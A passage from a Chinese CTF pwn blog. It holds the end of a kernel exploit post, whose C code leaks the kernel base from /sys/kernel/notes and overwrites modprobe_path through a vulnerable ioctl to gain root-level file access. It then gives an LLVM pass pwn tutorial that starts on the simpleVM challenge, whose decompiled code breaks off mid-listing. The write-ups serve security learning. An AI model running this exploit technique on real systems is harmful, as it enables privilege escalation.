class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">size_t</span> addr, <span class="type">size_t</span> vul)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">thisNote</span>;</span></span><br><span class="line">    thisNote.addr = addr;</span><br><span class="line">    thisNote.vul = vul;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;thisNote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> leak, kernel_base;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x22961c0</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    arb_write(modprobe_path, <span class="number">0x7465672f706d742f</span>);</span><br><span class="line">    arb_write(modprobe_path + <span class="number">8</span>, <span class="number">0x6c6c656873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is %s\n&quot;</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：  </p><img src="/2024/04/17/notes/2.png" class="" title="我的图图呢">  <p>显然泄露出来的内核地址是可用的。通过调试发现泄露出来的是 <code>startup_xen</code> 的地址  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_INIT_P2M,       .quad (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然而 <code>Cook</code> 发布了 <code>leaking_addresses.pl</code> 的补丁。它可以读取内核符号文件（例如 <code>/proc/kallsyms</code> ），并查看与这些符号关联的地址是否出现在 <code>/sys/kernel/notes</code> 这样的二进制文件中。有了此更改之后， <code>leaking_addresses.pl</code> 就会发现这种长期存在的内核地址泄露，但我感觉还是会有漏网之鱼（笑  </p><p>reference：<br><a href="https://lore.kernel.org/all/202402180028.6DB512C50@keescook/">https://lore.kernel.org/all/202402180028.6DB512C50@keescook/</a><br><a href="https://lwn.net/Articles/962782/">https://lwn.net/Articles/962782/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvm pass pwn</title>
      <link href="/2024/03/15/llvm/"/>
      <url>/2024/03/15/llvm/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>既然说到<code>llvm pass pwn</code>，我们肯定要先了解<code>llvm</code>到底是一个什么东西<br>学过编译原理的人应该都知道，编译过程主要可以划分为前端与后端：  </p><ul><li>前端把源代码翻译成中间表示 (<code>IR</code>)</li><li>后端把IR编译成目标平台的机器码。当然，<code>IR</code>也可以给解释器解释执行</li></ul><p>然而，经典的编译器如<code>gcc</code>在设计上都是提供一条龙服务的： 你不需要知道它使用的<code>IR</code>是什么样的，它也不会暴露中间接口来给你操作它的<code>IR</code>。 换句话说，从前端到后端，这些编译器的大量代码都是强耦合的。  </p><p>这样做有好处也有坏处。好处是，因为不需要暴露中间过程的接口，它可以在内部做任何想做的平台相关的优化。 而坏处是，每当一个新的平台出现，这些编译器都要各自为政实现一个从自己的<code>IR</code>到新平台的后端。 甚至如果当一种新语言出现，且需要实现一个新的编译器，那么可能需要设计一个新的<code>IR</code>，以及针对大部分平台实现这个<code>IR</code>的后端。 不妨想一下，如果有M种语言、<code>N</code>种目标平台，那么最坏情况下要实现 <code>M*N</code> 个前后端。这是很低效的。  </p><p>因此，我们很自然地会想，如果大家都共用一种<code>IR</code>呢？ 那么每当新增加一种语言，我们就只要添加一个这个语言到<code>IR</code>的前端； 每当新增加一种目标平台，我们就只要添加一个<code>IR</code>到这个目标平台的后端。 如果有M种语言、N种目标平台，那么最优情况下我们只要实现 <code>M+N</code> 个前后端。  </p><p>而<code>LLVM</code>就是这样一个项目。<code>LLVM</code>的核心设计了一个叫 <code>LLVM IR</code> 的中间表示， 并以库(<code>Library</code>) 的方式提供一系列接口， 为你提供诸如操作<code>IR</code>、生成目标平台代码等等后端的功能。  </p><p>那么 <code>LLVM Pass</code> 又是什么呢？ <code>Pass</code>就是“遍历一遍<code>IR</code>，可以同时对它做一些操作”的意思。翻译成中文应该叫“趟”。 在实现上，<code>LLVM</code>的核心库中会给你一些 <code>Pass</code>类 去继承。你需要实现它的一些方法。 最后使用<code>LLVM</code>的编译器会把它翻译得到的<code>IR</code>传入<code>Pass</code>里，给你遍历和修改。  </p><p>下面列出几个比较重要的命令行工具：  </p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的不是目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是<code>LLVM IR</code>的二进制格式，而不是机器码。</li><li><code>opt</code>：优化<code>LLVM IR</code>。输出新的<code>LLVM IR</code>。</li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行<code>LLVM IR</code>。</li></ul><p>下面简单聊聊<code>llvm IR</code>  </p><h3 id="何为LLVM-IR"><a href="#何为LLVM-IR" class="headerlink" title="何为LLVM IR"></a>何为LLVM IR</h3><ul><li><code>LVM IR</code> 是一门低级编程语言，语法类似于汇编</li><li>任何高级编程语言（如<code>C++</code>）都可以用 <code>LLVM IR</code> 表示</li><li>基于 <code>LLVM IR</code> 可以很方便地进行代码优化(任何编程语言都能统一转换为<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="我的图图呢">  <h3 id="LLVM-IR的两种表示方法"><a href="#LLVM-IR的两种表示方法" class="headerlink" title="LLVM IR的两种表示方法"></a>LLVM IR的两种表示方法</h3><ul><li>人类可以阅读的文本形式，文件后缀为 <code>.ll</code></li><li>易于机器处理的二进制格式，文件后缀为 <code>.bc</code></li></ul><p>下面给出一些常用的指令：  </p><ul><li>.c -&gt; .ll：clang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>下面来分析官方文档中一个入门级别的<code>llvm pass</code>程序：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// 重写runOnFunction，使得每遍历到一个函数时就输出函数名</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// 使用 RegisterPass 宏注册 Hello Pass。这允许它通过命令行参数传递给LLVM工具</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>这段代码的主要内容是注册了一个<code>Hello</code>函数，重写了<code>runOnFunction</code>函数，使得每遍历到一个函数时就输出函数名。  </p><p>一般来说，在<code>pwn</code>题中，漏洞主要来自于<code>so</code>文件中，而漏洞多产生于重写了<code>so</code>文件中的<code>runOnFunction</code>函数，我们可以通过在<code>ida</code>中搜索<code>vtable</code>来定位这一个函数，而我们要攻击的则是<code>opt</code>这个<code>elf</code>文件<br>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位  </p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载常见的<code>clang</code>和<code>llvm</code>版本  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>其中<code>opt</code>是<code>LLVM</code>的优化器和分析器，可加载指定的模块，对输入的<code>LLVM IR</code>或者<code>LLVM</code>字节码进行优化或分析。<code>CTF</code>题目一般会给出所需版本的<code>opt</code>文件（可用<code>./opt --version</code>查看版本）或者在<code>README</code>文档中告知<code>opt</code>版本。安装好<code>llvm</code>后，可在<code>/usr/lib/llvm-xx/bin/opt</code>路径下找到对应<code>llvm</code>版本的<code>opt</code>文件（一般不开<code>PIE</code>保护）  </p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="[红帽杯 2021] simpleVM"></a>[红帽杯 2021] simpleVM</h3><p>好习惯，上来先给<code>opt-8</code>来一发<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="我的图图呢">  <p>可以发现程序并没有开启<code>PIE</code>保护而且<code>got</code>表可改<br>将<code>VMPass.so</code>拖进<code>ida</code>，漏洞通常都在这一个<code>so</code>文件中<br>我们首先看<code>start</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_6510</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_20E990, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>PASS</code>注册名称为<code>VMPass</code>。我们尝试在<code>ida</code>中查找<code>runOnFunction</code>函数，结果发现这个函数的符号表给删了？图片中的<code>sub_6830</code>函数即为我们要找的<code>runOnFunction</code>函数函数  </p><img src="/2024/03/15/llvm/3.png" class="" title="我的图图呢">  <p>接下来分析一下<code>runOnFunction</code>函数  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改函数先通过<code>getName(a2)</code>来获取<code>.ll</code>文件中定义的函数名字，如果该函数的名字为<code>o0o0o0o0</code>，则会进入<code>sub_6AC0</code>这个函数进行进一步的处理<br>定位到关键函数<code>sub_6B80</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *v6; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span 